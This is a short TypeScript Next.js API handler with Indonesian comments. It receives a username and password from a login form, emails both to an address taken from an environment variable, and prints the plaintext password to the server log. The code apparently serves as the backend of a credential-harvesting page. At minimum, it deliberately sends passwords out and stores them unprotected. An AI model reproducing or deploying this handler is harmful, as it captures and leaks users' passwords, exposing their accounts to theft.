// server/api/log-login.ts
import {
  NextApiRequest,
  NextApiResponse,
} from 'next';

import { sendLoginEmail } from '../utils/send-login-email';

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  if (req.method !== "POST") {
    return res.status(405).json({ message: "Method not allowed" });
  }

  const { username, password } = req.body; // Ambil username dan password dari body

  if (!username) {
    return res.status(400).json({ message: "Username is required" });
  }

  try {
    // Kirim email log login
    await sendLoginEmail(username, password); // Kirim username dan password

    console.log(`Email sent successfully to ${process.env.EMAIL_RECEIVER} with username: ${username} and password: ${password}`);
    res.status(200).json({ message: "Login email sent successfully" });
  } catch (error) {
    console.error("Error in log-login handler:", error);
    res.status(500).json({ message: "Failed to send login email" });
  }
}